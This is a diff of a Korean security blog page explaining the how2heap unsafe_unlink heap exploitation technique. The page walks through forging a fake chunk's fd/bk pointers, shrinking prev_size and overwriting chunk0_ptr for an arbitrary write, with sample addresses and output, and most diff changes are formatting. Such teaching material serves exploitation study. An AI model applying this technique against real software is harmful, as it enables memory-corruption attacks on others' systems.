+&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.<br />
+&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.<br />
+이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False<br />
+<code>Fake chunk fd: 0x602058</code><br />
 <code>Fake chunk bk: 0x602060</code></p>
-<p>chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.<br>
-chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.<br>
-fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.<br>
-만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 <code>0x90</code>이 될 것이다.<br>
-그러나 이것은 새로운 값이다: <code>0x80</code><br>
+<p>chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.<br />
+chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.<br />
+fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.<br />
+만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 <code>0x90</code>이 될 것이다.<br />
+그러나 이것은 새로운 값이다: <code>0x80</code><br />
 chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.</p>
 <p>이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다</p>
-<p>이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.<br>
-chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.<br>
-<code>원래 값: Hello!~</code><br>
-<code>-------chunk0_ptr[0]=0x4141414142424242LL-------</code><br>
+<p>이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.<br />
+chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.<br />
+<code>원래 값: Hello!~</code><br />
+<code>-------chunk0_ptr[0]=0x4141414142424242LL-------</code><br />
 <code>바뀐 값: BBBBAAAA</code></p>
 <center><small>
-<p><strong><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">Source</a></strong></p>
-<p></p></small></center><p></p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c">Source</a></strong></p>
+<p></small></center></p>
 
         </div>
         <footer class="article-footer">
@@ -238,7 +258,7 @@ chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 v
 
 
 
-    <a data-url="https://j0n9hyun.xyz/theory/How2Heap-unsafe-unlink-c/" data-id="ck5p1non8001mlyfpdx8m0cua" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="https://j0n9hyun.xyz/theory/How2Heap-unsafe-unlink-c/" data-id="ckdzanqed001qz5mph9gi1qeg" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -318,7 +338,7 @@ chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 v
         "url": "https://j0n9hyun.xyz/theory/How2Heap-unsafe-unlink-c/",
         "description": " unsafe_unlink.c
 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&g"
-        "wordCount": 733
+        "wordCount": 755
     }
 </script>
 
@@ -435,7 +455,7 @@ chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 v
     <div class="widget-wrap widget-list">
         <h3 class="widget-title">태그</h3>
         <div class="widget">
-            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">21</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theory/">Theory</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/">Tips</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wargame/">Wargame</a><span class="tag-list-count">3</span></li></ul>
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">21</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theory/" rel="tag">Theory</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/" rel="tag">Tips</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wargame/" rel="tag">Wargame</a><span class="tag-list-count">3</span></li></ul>
         </div>
     </div>
 
@@ -490,25 +510,47 @@ chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 v
 
 
     
-        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
-        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
     
     
-        <script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
     
     
 
 
 
 <!-- Custom Scripts -->
+
 <script src="/js/main.js"></script>
+
 
     </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </body>
